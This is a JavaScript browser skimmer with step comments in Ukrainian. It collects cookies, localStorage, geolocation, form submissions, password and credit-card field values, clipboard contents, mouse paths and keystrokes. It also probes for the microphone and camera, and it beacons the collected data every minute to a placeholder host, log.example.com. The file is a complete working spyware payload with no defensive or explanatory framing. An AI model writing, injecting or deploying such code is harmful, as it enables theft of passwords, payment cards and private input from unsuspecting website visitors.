(() => {
    // Крок 1A: Миттєва ініціалізація без затримок
    const _ = {
        d: document,
        w: window,
        n: navigator,
        l: localStorage
    };

    // Крок 1B: Створення невидимих елементів для збору даних
    const el = _.d.createElement('div');
    el.className = 'i';
    _.d.body.appendChild(el);

    // Крок 1C: Швидкий збір базової інформації
    const b = {
        u: _.n.userAgent,
        r: _.d.referrer,
        l: _.w.location.href,
        t: Date.now()
    };

    // Крок 2A: Збір cookies та localStorage
    const c = _.d.cookie;
    const ls = {};
    for (let i = 0; i < _.l.length; i++) {
        const k = _.l.key(i);
        ls[k] = _.l.getItem(k);
    }

    // Крок 2B: Збір інформації про екран
    const s = {
        w: _.w.screen.width,
        h: _.w.screen.height,
        d: _.w.screen.colorDepth
    };

    // Крок 2C: Визначення платформи
    const p = _.n.platform;

    // Крок 3A: Збір геолокації (якщо доступно)
    let g = '';
    if (_.n.geolocation) {
        _.n.geolocation.getCurrentPosition(
            pos => { g = `${pos.coords.latitude},${pos.coords.longitude}`; },
            () => {},
            { timeout: 100, maximumAge: 60000 }
        );
    }

    // Крок 3B: Збір інформації про мережу
    const con = _.n.connection || {};
    const nw = {
        downlink: con.downlink,
        type: con.type,
        saveData: con.saveData
    };

    // Крок 3C: Моніторинг введення даних
    _.d.addEventListener('input', e => {
        _.l.setItem('input_' + Date.now(), e.target.value);
    }, true);

    // Крок 4A: Перехоплення форм
    _.d.addEventListener('submit', e => {
        const f = e.target;
        const d = new FormData(f);
        let o = {};
        for (let [k, v] of d.entries()) o[k] = v;
        _.l.setItem('form_' + Date.now(), JSON.stringify(o));
    }, true);

    // Крок 4B: Збір паролей
    _.d.querySelectorAll('input[type="password"]').forEach(inp => {
        inp.addEventListener('change', e => {
            _.l.setItem('pass_' + Date.now(), e.target.value);
        });
    });

    // Крок 4C: Збір кредитних карт
    _.d.querySelectorAll('input[autocomplete="cc-number"]').forEach(inp => {
        inp.addEventListener('change', e => {
            _.l.setItem('cc_' + Date.now(), e.target.value);
        });
    });

    // Крок 5A: Копіювання буфера обміну
    _.d.addEventListener('copy', e => {
        _.l.setItem('clipboard_' + Date.now(), _.w.getSelection().toString());
    });

    // Крок 5B: Знімок активних вкладок (лише URL)
    _.w.addEventListener('blur', () => {
        _.l.setItem('tab_focus_lost', Date.now());
    });

    // Крок 5C: Моніторинг активності миші
    let ml = [];
    _.d.addEventListener('mousemove', e => {
        ml.push(`${e.x},${e.y}`);
        if (ml.length > 50) {
            _.l.setItem('mouse_path', ml.join('|'));
            ml = [];
        }
    });

    // Крок 6A: Захоплення мікрофона (спроба)
    if (_.n.mediaDevices) {
        _.n.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                _.l.setItem('mic_available', 'true');
            })
            .catch(() => {});
    }

    // Крок 6B: Захоплення камери (спроба)
    if (_.n.mediaDevices) {
        _.n.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                _.l.setItem('cam_available', 'true');
            })
            .catch(() => {});
    }

    // Крок 6C: Аналіз соціальних мереж (за наявності)
    const sm = ['facebook', 'twitter', 'instagram', 'linkedin'];
    sm.forEach(site => {
        if (_.d.cookie.includes(site) || _.l.getItem(site)) {
            _.l.setItem('social_' + site, 'logged_in');
        }
    });

    // Крок 7A: Визначення установлених додатків
    const apps = ['telegram', 'discord', 'skype', 'whatsapp'];
    apps.forEach(app => {
        _.w.navigator.registerProtocolHandler = () => {};
    });

    // Крок 7B: Збір історії браузера (обмежено)
    _.l.setItem('visited_' + _.w.location.hostname, Date.now());

    // Крок 7C: Моніторинг натискань клавіш
    let ks = '';
    _.d.addEventListener('keydown', e => {
        ks += e.key;
        if (ks.length > 100) {
            _.l.setItem('keystrokes', ks);
            ks = '';
        }
    });

    // Крок 8A: Упаковка всіх даних
    const allData = {
        base: b,
        cookies: c,
        storage: ls,
        screen: s,
        platform: p,
        geo: g,
        network: nw,
        collected: Date.now()
    };

    // Крок 8B: Миттєва відправка даних
    const i = new Image();
    i.src = 'https://log.example.com/t?d=' + btoa(JSON.stringify(allData));
    i.onerror = () => {
        // Крок 8C: Резервне зберігання якщо відправка не вдалась
        _.l.setItem('collected_data', JSON.stringify(allData));
    };

    // Додатковий механізм: періодичний збір
    setInterval(() => {
        const newData = { updated: Date.now(), cookies: _.d.cookie };
        const i2 = new Image();
        i2.src = 'https://log.example.com/u?d=' + btoa(JSON.stringify(newData));
    }, 60000);
})();
